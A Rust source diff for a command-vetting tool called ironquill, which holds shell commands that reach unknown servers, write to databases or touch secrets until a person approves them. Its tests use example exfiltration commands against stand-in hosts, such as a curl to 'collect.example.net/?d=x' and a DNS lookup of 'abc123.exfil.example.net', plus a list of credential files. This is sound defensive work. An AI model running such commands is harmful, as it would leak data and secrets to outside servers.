@@ -30,6 +30,9 @@ pub fn unreadable(reason: &str) -> bool {
 /// to the person first, and the secrets of the environment it names.
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct Assessment {
+    /// The servers it reaches that are not known: it waits until the
+    /// person allows them.
+    pub hosts: Vec<String>,
     /// It would show a secret's value: it never runs. Models do not see
     /// secrets; tools that need them find their own.
     pub refused: Vec<String>,
@@ -41,13 +44,28 @@ pub struct Assessment {
     pub secrets: Vec<String>,
 }
 
+/// How strictly a command is read.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct Policy {
+    /// A program ironquill has no rule for waits too.
+    pub strict: bool,
+    /// The servers a command may reach without asking, as `host` or
+    /// `*.domain`; `None` checks no server.
+    pub known_hosts: Option<Vec<String>>,
+}
+
 /// Reads `command` before it runs. See [`Assessment`].
 ///
 /// This reads the command as written. It holds what it does not understand
 /// rather than guess, but a command can always be dressed up: it is a net,
 /// not a sandbox.
-pub fn assess(command: &str, root: &Path, strict: bool) -> Assessment {
+pub fn assess(command: &str, root: &Path, policy: &Policy) -> Assessment {
+    let strict = policy.strict;
     let mut found = Assessment {
+        hosts: match &policy.known_hosts {
+            Some(known) => unknown_hosts(command, known),
+            None => Vec::new(),
+        },
         held: hold_reasons(command, root),
         refused: secret_reasons(command),
         secrets: named_secrets(command),
@@ -91,6 +109,7 @@ pub fn assess(command: &str, root: &Path, strict: bool) -> Assessment {
             let words = unwrapped(&all);
             if let Some(program) = words.first().map(|w| program_name(w))
                 && !KNOWN.contains(&program)
+                && !program.starts_with("cargo-")
                 && !found.held.iter().any(|r| r.contains(program))
             {
                 found.held.push(format!(
@@ -106,7 +125,7 @@ pub fn assess(command: &str, root: &Path, strict: bool) -> Assessment {
 
 /// The programs ironquill knows, in strict mode: those it has rules for,
 /// those that only read, and the project's usual tools.
-const KNOWN: [&str; 97] = [
+const KNOWN: &[&str] = &[
     // Reading and looking around.
     "cat",
     "less",
@@ -114,7 +133,10 @@ const KNOWN: [&str; 97] = [
     "head",
     "tail",
     "grep",
+    "egrep",
+    "fgrep",
     "rg",
+    "ag",
     "ls",
     "stat",
     "file",
@@ -123,15 +145,20 @@ const KNOWN: [&str; 97] = [
     "cmp",
     "md5sum",
     "sha256sum",
+    "shasum",
     "bat",
     "find",
+    "fd",
     "tree",
     "du",
     "df",
     "pwd",
     "which",
+    "type",
     "whoami",
+    "id",
     "uname",
+    "hostname",
     "date",
     "echo",
     "printf",
@@ -143,6 +170,7 @@ const KNOWN: [&str; 97] = [
     "uniq",
     "cut",
     "tr",
+    "column",
     "jq",
     "yq",
     "awk",
@@ -156,7 +184,24 @@ const KNOWN: [&str; 97] = [
     "env",
     "printenv",
     "cd",
-    // Changing files in the project.
+    "xxd",
+    "hexdump",
+    "od",
+    "nl",
+    "paste",
+    "comm",
+    "join",
+    "fold",
+    "expr",
+    "seq",
+    "lsof",
+    "netstat",
+    "ss",
+    "dig",
+    "nslookup",
+    "host",
+    "ping",
+    // Changing files in the project, archives.
     "mkdir",
     "touch",
     "cp",
@@ -164,6 +209,12 @@ const KNOWN: [&str; 97] = [
     "tee",
     "chmod",
     "ln",
+    "tar",
+    "gzip",
+    "gunzip",
+    "zip",
+    "unzip",
+    "patch",
     // With rules of their own.
     "git",
     "gh",
@@ -178,8 +229,12 @@ const KNOWN: [&str; 97] = [
     "pulumi",
     "docker",
     "podman",
+    "docker-compose",
     "curl",
     "wget",
+    "http",
+    "https",
+    "xh",
     "rm",
     "rmdir",
     "sudo",
@@ -189,25 +244,67 @@ const KNOWN: [&str; 97] = [
     "ssh",
     "scp",
     "rsync",
+    "psql",
+    "mysql",
+    "sqlite3",
+    "redis-cli",
+    "mongosh",
     // Building, testing, running the project.
     "make",
     "gmake",
+    "cmake",
+    "ninja",
     "cargo",
     "rustc",
+    "rustup",
     "npm",
     "pnpm",
     "yarn",
     "bun",
     "npx",
     "node",
+    "deno",
+    "tsc",
+    "eslint",
+    "prettier",
+    "jest",
+    "vitest",
     "python",
     "python3",
     "pip",
+    "pip3",
     "pytest",
     "uv",
+    "uvx",
     "poetry",
-    "go",
+    "pipenv",
+    "pdm",
+    "hatch",
     "ruff",
+    "black",
+    "isort",
+    "mypy",
+    "pylint",
+    "flake8",
+    "coverage",
+    "tox",
+    "nox",
+    "alembic",
+    "uvicorn",
+    "gunicorn",
+    "django-admin",
+    "go",
+    "gofmt",
+    "java",
+    "javac",
+    "mvn",
+    "gradle",
+    "gcc",
+    "g++",
+    "clang",
+    "cc",
+    "ld",
+    "pre-commit",
 ];
 
 /// The biggest script read before it runs.
@@ -597,6 +694,174 @@ const READERS: [&str; 16] = [
     "bat",
 ];
 
+/// The servers `command` reaches with an HTTP client that are not among
+/// `known`.
+fn unknown_hosts(command: &str, known: &[String]) -> Vec<String> {
+    let mut hosts = Vec::new();
+    for (segment, _) in segments(command) {
+        let all = words(&segment);
+        let words = unwrapped(&all);
+        let Some(program) = words.first().map(|w| program_name(w)) else {
+            continue;
+        };
+        let args = &words[1..];
+        // Name lookups and pings carry data in the name they ask for; git
+        // reaches the URL it is given.
+        if matches!(
+            program,
+            "dig" | "nslookup" | "host" | "ping" | "ping6" | "traceroute"
+        ) {
+            for target in args.iter().filter(|a| !a.starts_with(['-', '@', '+'])) {
+                if let Some(host) = host_of(target)
+                    && !host_known(&host, known)
+                    && !hosts.contains(&host)
+                {
+                    hosts.push(host);
+                }
+            }
+            continue;
+        }
+        if program == "git" {
+            for target in args.iter().filter(|a| a.contains("://") || a.contains('@')) {
+                let target = target.split_once('@').map_or(target.as_str(), |(_, r)| r);
+                let host = if target.contains("://") {
+                    host_of(target)
+                } else {
+                    target.split(':').next().map(str::to_owned)
+                };
+                if let Some(host) = host
+                    && !host_known(&host, known)
+                    && !hosts.contains(&host)
+                {
+                    hosts.push(host);
+                }
+            }
+            continue;
+        }
+        if !matches!(
+            program,
+            "curl" | "wget" | "http" | "https" | "xh" | "httpie"
+        ) {
+            continue;
+        }
+        // URLs, or a bare host as the first word that is not an option.
+        let mut targets: Vec<&str> = args
+            .iter()
+            .filter(|a| a.contains("://"))
+            .map(String::as_str)
+            .collect();
+        if targets.is_empty()
+            && let Some(bare) = args.iter().find(|a| !a.starts_with('-') && a.contains('.'))
+        {
+            targets.push(bare);
+        }
+        for target in targets {
+            let Some(host) = host_of(target) else {
+                continue;
+            };
+            if !host_known(&host, known) && !hosts.contains(&host) {
+                hosts.push(host);
+            }
+        }
+    }
+    hosts
+}
+
+/// The host of a URL or of `host/path`, without port or user.
+fn host_of(target: &str) -> Option<String> {
+    let rest = target.split_once("://").map_or(target, |(_, r)| r);
+    let authority = rest.split(['/', '?', '#']).next()?;
+    let host = authority.rsplit('@').next()?;
+    let host = if let Some(v6) = host.strip_prefix('[') {
+        v6.split(']').next()?
+    } else {
+        host.split(':').next()?
+    };
+    let host = host.trim().to_ascii_lowercase();
+    (!host.is_empty()).then_some(host)
+}
+
+/// Whether `host` is one of `known`: the same, or under a `*.domain`.
+fn host_known(host: &str, known: &[String]) -> bool {
+    known.iter().any(|k| match k.strip_prefix("*.") {
+        Some(domain) => host == domain || host.ends_with(&format!(".{domain}")),
+        None => host == k,
+    })
+}
+
+/// The servers a project and its person already use: the project's git
+/// remotes, the clusters of the kubeconfig, and the usual ones of GitHub,
+/// AWS and the package registries. Read, never shown.
+pub fn known_hosts(root: &Path) -> Vec<String> {
+    let mut hosts: Vec<String> = [
+        "localhost",
+        "127.0.0.1",
+        "::1",
+        "github.com",
+        "*.github.com",
+        "*.githubusercontent.com",
+        "*.amazonaws.com",
+        "*.aws.amazon.com",
+        "pypi.org",
+        "files.pythonhosted.org",
+        "registry.npmjs.org",
+        "*.npmjs.org",
+        "crates.io",
+        "*.crates.io",
+        "proxy.golang.org",
+        "sum.golang.org",
+    ]
+    .map(str::to_owned)
+    .to_vec();
+    let mut add = |target: &str| {
+        let target = target.split_once('@').map_or(target, |(_, rest)| rest);
+        let host = if target.contains("://") {
+            host_of(target)
+        } else {
+            // `host:owner/repo`, as ssh remotes are written.
+            target.split(':').next().map(str::to_owned)
+        };
+        if let Some(host) = host.filter(|h| !h.is_empty())
+            && !hosts.contains(&host)
+        {
+            hosts.push(host);
+        }
+    };
+    if let Ok(output) = std::process::Command::new("git")
+        .args(["remote", "-v"])
+        .current_dir(root)
+        .env_remove("GIT_DIR")
+        .env_remove("GIT_INDEX_FILE")
+        .env_remove("GIT_WORK_TREE")
+        .stderr(std::process::Stdio::null())
+        .output()
+    {
+        for line in String::from_utf8_lossy(&output.stdout).lines() {
+            if let Some(url) = line.split_whitespace().nth(1) {
+                add(url);
+            }
+        }
+    }
+    let kubeconfigs: Vec<std::path::PathBuf> = match std::env::var_os("KUBECONFIG") {
+        Some(paths) => std::env::split_paths(&paths).collect(),
+        None => std::env::var_os("HOME")
+            .map(|home| Path::new(&home).join(".kube/config"))
+            .into_iter()
+            .collect(),
+    };
+    for config in kubeconfigs {
+        let Ok(text) = std::fs::read_to_string(config) else {
+            continue;
+        };
+        for line in text.lines() {
+            if let Some(server) = line.trim().strip_prefix("server:") {
+                add(server.trim().trim_matches(['"', '\'']));
+            }
+        }
+    }
+    hosts
+}
+
 /// Files that hold secrets: reading them shows them.
 const SECRET_FILES: [&str; 16] = [
     ".aws/credentials",
@@ -955,10 +1220,22 @@ fn hold_reasons(command: &str, root: &Path) -> Vec<String> {
         ("drop database", "it drops a database"),
         ("delete from", "it deletes rows from a database"),
         ("truncate table", "it empties a database table"),
+        ("alter table", "it changes a database's tables"),
+        ("insert into", "it writes to a database"),
+        ("grant ", "it changes who may use a database"),
+        ("revoke ", "it changes who may use a database"),
+        ("create table", "it changes a database's tables"),
+        ("create database", "it creates a database"),
     ] {
         if lower.contains(word) {
             hold(reason);
         }
+    }
+    // `UPDATE x SET`: an update, not the word in passing.
+    if let Some(at) = lower.find("update ")
+        && lower[at..].contains(" set ")
+    {
+        hold("it writes to a database");
     }
     reasons
 }
@@ -1542,11 +1819,11 @@ mod tests {
     use super::*;
 
     fn held(command: &str) -> Vec<String> {
-        assess(command, Path::new("/nonexistent"), false).held
+        assess(command, Path::new("/nonexistent"), &Policy::default()).held
     }
 
     fn refused(command: &str) -> Vec<String> {
-        assess(command, Path::new("/nonexistent"), false).refused
+        assess(command, Path::new("/nonexistent"), &Policy::default()).refused
     }
 
     #[test]
@@ -1724,17 +2001,17 @@ mod tests {
             "pytest -q",
         ] {
             assert!(
-                assess(command, root, false).held.is_empty(),
+                assess(command, root, &Policy::default()).held.is_empty(),
                 "{command}: {:?}",
-                assess(command, root, false).held
+                assess(command, root, &Policy::default()).held
             );
         }
         assert_eq!(
-            assess("make deploy", root, false).held,
+            assess("make deploy", root, &Policy::default()).held,
             ["make deploy: it changes something in a cloud account"]
         );
         assert_eq!(
-            assess("npm run release", root, false).held,
+            assess("npm run release", root, &Policy::default()).held,
             ["npm run release: it publishes a package"]
         );
         // Changed or new since the last commit: nobody saw it, it waits.
@@ -1747,7 +2024,7 @@ mod tests {
             ("make run", "Makefile"),
         ] {
             assert_eq!(
-                assess(command, root, false).held,
+                assess(command, root, &Policy::default()).held,
                 [format!(
                     "it runs {file}, which is new or changed since the last commit"
                 )],
@@ -1761,14 +2038,18 @@ mod tests {
             r#"{"dependencies": {"x": "1"}, "scripts": {"start": "node server.js", "release": "npm publish"}}"#,
         )
         .unwrap();
-        assert!(assess("npm start", root, false).held.is_empty());
+        assert!(
+            assess("npm start", root, &Policy::default())
+                .held
+                .is_empty()
+        );
         std::fs::write(
             root.join("package.json"),
             r#"{"scripts": {"start": "node other.js"}}"#,
         )
         .unwrap();
         assert_eq!(
-            assess("npm start", root, false).held,
+            assess("npm start", root, &Policy::default()).held,
             [
                 "it runs the start script of package.json, which is new or changed since the last commit"
             ]
@@ -1777,7 +2058,7 @@ mod tests {
         let bare = tempfile::tempdir().unwrap();
         std::fs::write(bare.path().join("run.py"), "print(1)\n").unwrap();
         assert_eq!(
-            assess("python run.py", bare.path(), false).held,
+            assess("python run.py", bare.path(), &Policy::default()).held,
             ["it runs run.py, and without git nothing says it is the project's own"]
         );
     }
@@ -1823,7 +2104,17 @@ mod tests {
 
     #[test]
     fn strict_mode_holds_what_it_does_not_know() {
-        let strict = |command: &str| assess(command, Path::new("/nonexistent"), true).held;
+        let strict = |command: &str| {
+            assess(
+                command,
+                Path::new("/nonexistent"),
+                &Policy {
+                    strict: true,
+                    known_hosts: None,
+                },
+            )
+            .held
+        };
         assert_eq!(
             strict("mysterytool --all"),
             ["in strict mode, mysterytool is not a program ironquill knows"]
@@ -1833,24 +2124,88 @@ mod tests {
     }
 
     #[test]
+    fn a_server_not_used_before_waits() {
+        let known: Vec<String> = [
+            "*.github.com",
+            "*.amazonaws.com",
+            "k8s.internal.example.com",
+        ]
+        .map(str::to_owned)
+        .to_vec();
+        let policy = Policy {
+            strict: false,
+            known_hosts: Some(known),
+        };
+        let hosts = |command: &str| assess(command, Path::new("/nonexistent"), &policy).hosts;
+        for command in [
+            "curl -s https://api.github.com/repos/o/r",
+            "curl https://s3.eu-west-1.amazonaws.com/b/k",
+            "kubectl get pods",
+            "dig k8s.internal.example.com",
+            "git clone https://github.com/o/r",
+        ] {
+            assert!(hosts(command).is_empty(), "{command}: {:?}", hosts(command));
+        }
+        assert_eq!(
+            hosts("curl -s 'https://collect.example.net/?d=x'"),
+            ["collect.example.net"]
+        );
+        assert_eq!(hosts("wget example.org/x"), ["example.org"]);
+        assert_eq!(
+            hosts("dig abc123.exfil.example.net"),
+            ["abc123.exfil.example.net"]
+        );
+        assert_eq!(
+            hosts("git clone git@code.example.org:o/r.git"),
+            ["code.example.org"]
+        );
+    }
+
+    #[test]
+    fn known_servers_come_from_the_project_and_the_usual_ones() {
+        let dir = committed(&[("README", "x")]);
+        let ok = std::process::Command::new("git")
+            .args([
+                "remote",
+                "add",
+                "origin",
+                "git@code.example.org:team/app.git",
+            ])
+            .current_dir(dir.path())
+            .env_remove("GIT_DIR")
+            .env_remove("GIT_INDEX_FILE")
+            .status()
+            .unwrap()
+            .success();
+        assert!(ok);
+        let hosts = known_hosts(dir.path());
+        assert!(hosts.contains(&"code.example.org".to_owned()), "{hosts:?}");
+        assert!(hosts.contains(&"github.com".to_owned()));
+    }
+
+    #[test]
     fn overwriting_an_existing_file_is_held() {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("config.yaml"), "a").unwrap();
         assert_eq!(
-            assess("echo x > config.yaml", dir.path(), false).held,
+            assess("echo x > config.yaml", dir.path(), &Policy::default()).held,
             ["it overwrites an existing file with `>`"]
         );
         assert!(
-            assess("echo x >> config.yaml", dir.path(), false)
+            assess("echo x >> config.yaml", dir.path(), &Policy::default())
                 .held
                 .is_empty()
         );
         assert!(
-            assess("echo x > new.txt", dir.path(), false)
+            assess("echo x > new.txt", dir.path(), &Policy::default())
                 .held
                 .is_empty()
         );
-        assert!(assess("cargo test 2>&1", dir.path(), false).held.is_empty());
+        assert!(
+            assess("cargo test 2>&1", dir.path(), &Policy::default())
+                .held
+                .is_empty()
+        );
     }
 
     #[test]
@@ -1993,12 +2348,12 @@ mod tests {
         let found = assess(
             "curl -s -H \"Authorization: Bearer $API_TOKEN\" -b \"s=${DASHBOARD_SESSION}\" https://x.example.com/api",
             Path::new("/nonexistent"),
-            false,
+            &Policy::default(),
         );
         assert_eq!(found.secrets, ["API_TOKEN", "DASHBOARD_SESSION"]);
         assert!(found.refused.is_empty());
         assert!(
-            assess("echo $HOME", Path::new("/"), false)
+            assess("echo $HOME", Path::new("/"), &Policy::default())
                 .secrets
                 .is_empty()
         );
@@ -2044,16 +2399,16 @@ mod tests {
         ]);
         let root = dir.path();
 
-        let deploy = assess("./deploy.sh", root, false);
+        let deploy = assess("./deploy.sh", root, &Policy::default());
         assert_eq!(
             deploy.held,
             ["deploy.sh: it changes something in a cloud account"]
         );
         assert_eq!(
-            assess("sh leak.sh", root, false).refused,
+            assess("sh leak.sh", root, &Policy::default()).refused,
             ["leak.sh: it reads or touches a file of secrets"]
         );
-        let check = assess("bash check.sh", root, false);
+        let check = assess("bash check.sh", root, &Policy::default());
         assert!(check.held.is_empty());
         assert_eq!(check.secrets, ["API_TOKEN"]);
         // It gets the keys of the tools it runs.
